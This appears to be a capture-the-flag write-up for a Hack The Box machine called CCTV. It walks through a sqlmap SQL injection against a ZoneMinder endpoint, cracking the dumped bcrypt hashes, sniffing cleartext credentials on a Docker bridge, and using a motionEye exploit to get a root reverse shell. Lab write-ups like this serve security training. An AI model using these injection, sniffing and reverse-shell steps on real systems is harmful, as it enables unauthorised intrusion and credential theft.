
### Initial access
Port scan
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Access web and signing as `admin:admin`
Get session cookie and sqlmap dump cred
```zsh
┌──(kali㉿kali)-[~/HTB/CCTV]
└─$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
--cookie="ZMSESSID=se98eg7hnqna18vuckarklhvug;" \
--prefix="1 UNION SELECT 1,2,3,4 WHERE " \
--code 200 \
--technique=B \
-D zm -T Users -C Username,Password \
--predict-output \
--dump --batch


```

```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+

```

```bash
┌──(kali㉿kali)-[~/HTB/CCTV]
└─$ john   --wordlist=/usr/share/wordlists/rockyou.txt hash                    
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
opensesame       (?)     
admin            (?)     

```
Cred `mark:opensesame 
```bash
┌──(kali㉿kali)-[~/HTB/CCTV]
└─$ ssh mark@10.129.244.156                                                                     
The authenticity of host '10.129.244.156 (10.129.244.156)' can't be established.
ED25519 key fingerprint is SHA256:KrrHjS+nu1wJEfv1/NxT1fI+ODJaSRdJtFg201G+tO0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.156' (ED25519) to the list of known hosts.
mark@10.129.244.156's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 18 Sep 09:49:54 UTC 2026

  System load:           0.01
  Usage of /:            77.3% of 8.70GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             257
  Users logged in:       0
  IPv4 address for eth0: 10.129.244.156
  IPv6 address for eth0: dead:beef::250:56ff:feb9:23e4


Expanded Security Maintenance for Applications is not enabled.

144 updates can be applied immediately.
94 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

15 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
mark@cctv:~$ 

```
### Lateral Movement
Tcp dump docker
```bash {22}
mark@cctv:~$ tcpdump -i br-1b6b4b93c636 -A -l -v
tcpdump: listening on br-1b6b4b93c636, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:57:09.059264 IP (tos 0x0, ttl 64, id 30405, offset 0, flags [DF], proto TCP (6), length 60)
    172.25.0.11.38156 > 172.25.0.10.5000: Flags [S], cksum 0x5876 (incorrect -> 0xbc52), seq 1855883880, win 64240, options [mss 1460,sackOK,TS val 1100895547 ecr 0,nop,wscale 7], length 0
E..<v.@.@.k........
....n..h........Xv.........
A.U;........
09:57:09.059319 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    172.25.0.10.5000 > 172.25.0.11.38156: Flags [S.], cksum 0x5876 (incorrect -> 0x519b), seq 1916130109, ack 1855883881, win 65160, options [mss 1460,sackOK,TS val 2392363778 ecr 1100895547,nop,wscale 7], length 0
E..<..@.@..t...
........r5.=n..i....Xv.........
....A.U;....
09:57:09.059346 IP (tos 0x0, ttl 64, id 30406, offset 0, flags [DF], proto TCP (6), length 52)
    172.25.0.11.38156 > 172.25.0.10.5000: Flags [.], cksum 0x586e (incorrect -> 0x7cfa), ack 1, win 502, options [nop,nop,TS val 1100895547 ecr 2392363778], length 0
E..4v.@.@.k........
....n..ir5.>....Xn.....
A.U;....
09:57:09.059489 IP (tos 0x0, ttl 64, id 30407, offset 0, flags [DF], proto TCP (6), length 103)
    172.25.0.11.38156 > 172.25.0.10.5000: Flags [P.], cksum 0x58a1 (incorrect -> 0xea51), seq 1:52, ack 1, win 502, options [nop,nop,TS val 1100895547 ecr 2392363778], length 51
E..gv.@.@.k........
....n..ir5.>....X......
A.U;....USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status

```
Switch user
### Priv escalation
Linpeas
```
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      4096       127.0.0.1:8888       0.0.0.0:*                                                                                                
tcp   LISTEN 0      128        127.0.0.1:8765       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:9081       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8554       0.0.0.0:*          
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:1935       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:7999       0.0.0.0:*          
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
══╣ Unique listener bind addresses (T1049)

```
After curl test we see port 8765 is port have web ssh tunneling
```
┌──(kali㉿kali)-[~/HTB/CCTV]
└─$ ssh  -L 8765:127.0.0.1:8765 sa_mark@10.129.244.156
sa_mark@10.129.244.156's password: 

```
Read file config `cat /etc/motioneye/motion.conf` of motion eyes website
```bash
sa_mark@cctv:~$ cat /etc/motioneye/motion.conf 
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf

```

You need to tale snapshot i camera for file can store to trigger using https://www.exploit-db.com/exploits/52481
```
┌──(kali㉿kali)-[~/HTB/CCTV]
└─$ penelope --oscp-safe --no-log -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => cctv 10.129.244.156 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] [New Reverse Shell] => cctv 10.129.244.156 Linux-x86_64 👤 root(0) 😍 Session ID <2>
[+] [New Reverse Shell] => cctv 10.129.244.156 Linux-x86_64 👤 root(0) 😍 Session ID <3>

[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@cctv:/etc/motioneye# ls

```